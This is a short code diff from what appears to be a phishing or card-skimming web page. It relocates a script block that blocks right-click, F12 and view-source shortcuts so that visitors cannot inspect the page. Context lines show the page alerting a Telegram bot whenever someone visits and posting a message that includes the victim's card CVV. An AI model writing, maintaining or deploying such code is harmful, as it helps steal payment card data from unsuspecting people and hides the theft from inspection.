@@ -109,14 +109,6 @@
             }
         });
 
-        // Disable right-click and developer tools
-        document.addEventListener('contextmenu', (e) => e.preventDefault());
-        document.addEventListener('keydown', (e) => {
-            if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I') || (e.ctrlKey && e.key === 'U')) {
-                e.preventDefault();
-            }
-        });
-
         // Notify when a user accesses the page
         async function notifyUserEntry() {
             const telegramBotToken = 'YOUR_TELEGRAM_BOT_TOKEN';
@@ -164,6 +156,14 @@ CVV: ${data.cvv}`;
                     text: message,
                 }),
             });
+        });
+
+        // Disable right-click and developer tools
+        document.addEventListener('contextmenu', (e) => e.preventDefault());
+        document.addEventListener('keydown', (e) => {
+            if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I') || (e.ctrlKey && e.key === 'U')) {
+                e.preventDefault();
+            }
         });
     </script>
 </body>
